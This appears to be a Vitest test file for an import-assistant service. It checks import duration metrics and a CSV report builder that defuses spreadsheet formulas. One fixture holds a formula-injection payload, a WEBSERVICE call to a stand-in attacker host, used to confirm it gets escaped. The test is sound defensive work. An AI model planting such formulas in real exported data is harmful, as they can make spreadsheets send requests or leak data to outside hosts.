import { beforeEach, describe, expect, it, vi } from "vitest";

const mocks = vi.hoisted(() => ({
  getBatch: vi.fn(),
  reportRows: vi.fn(),
  dbQuery: vi.fn(),
}));

vi.mock("../config/database", () => ({ default: { query: mocks.dbQuery } }));

vi.mock("../module/import-assistant/repository/import-assistant.repository", async (importOriginal) => {
  const actual = await importOriginal<typeof import("../module/import-assistant/repository/import-assistant.repository")>();
  return {
    ...actual,
    repoGetBatch: mocks.getBatch,
    repoReportRows: mocks.reportRows,
  };
});

import { buildImportReportCsv } from "../module/import-assistant/services/import-assistant.service";
import { repoGetImportOperationsMetrics } from "../module/import-assistant/repository/import-assistant.repository";

describe("SOL-25 import export safety", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    mocks.getBatch.mockResolvedValue({ id: "11111111-1111-4111-8111-111111111111", entity_type: "CLIENT" });
  });

  it("reports measured import durations and keeps missing durations nullable", async () => {
    mocks.dbQuery
      .mockResolvedValueOnce({
        rows: [{
          batch_count: 3,
          freshness_at: "2026-08-14T10:00:00.000Z",
          in_progress_batches: 0,
          completed_batches: 2,
          average_seconds: "12.500",
          p95_seconds: "19.250",
          uploaded: 10,
          validated: 9,
          accepted: 8,
          rejected: 1,
          duplicates: 1,
          imported: 7,
        }],
      })
      .mockResolvedValueOnce({ rows: [] });

    const metrics = await repoGetImportOperationsMetrics({ error_limit: 5 });
    expect(metrics.duration).toEqual({
      completed_batches: 2,
      average_seconds: 12.5,
      p95_seconds: 19.25,
      unit: "seconds",
      definition: expect.stringContaining("Temps écoulé"),
    });
    expect(String(mocks.dbQuery.mock.calls[0]?.[0])).toContain("percentile_cont(0.95)");

    mocks.dbQuery
      .mockResolvedValueOnce({
        rows: [{
          batch_count: 1,
          freshness_at: "2026-08-14T10:00:00.000Z",
          in_progress_batches: 1,
          completed_batches: 0,
          average_seconds: null,
          p95_seconds: null,
          uploaded: 1,
          validated: 0,
          accepted: 0,
          rejected: 0,
          duplicates: 0,
          imported: 0,
        }],
      })
      .mockResolvedValueOnce({ rows: [] });
    const partial = await repoGetImportOperationsMetrics({ error_limit: 5 });
    expect(partial.reliability).toBe("PARTIAL");
    expect(partial.duration.average_seconds).toBeNull();
    expect(partial.duration.p95_seconds).toBeNull();
  });

  it("neutralizes spreadsheet formulas while retaining the row reference needed for correction", async () => {
    mocks.reportRows.mockResolvedValue([{
      row_number: 2,
      legacy_key: "=WEBSERVICE(\"https://attacker.invalid\")",
      status: "BLOCKED",
      action: "SKIP",
      target_id: null,
      target_code: null,
      issues: [{ code: "EMAIL_INVALID", message: "Adresse invalide", field: "email" }],
    }]);

    const report = await buildImportReportCsv("11111111-1111-4111-8111-111111111111");
    expect(report.csv).toContain("'=WEBSERVICE");
    expect(report.csv).not.toContain('"=WEBSERVICE');
  });
});
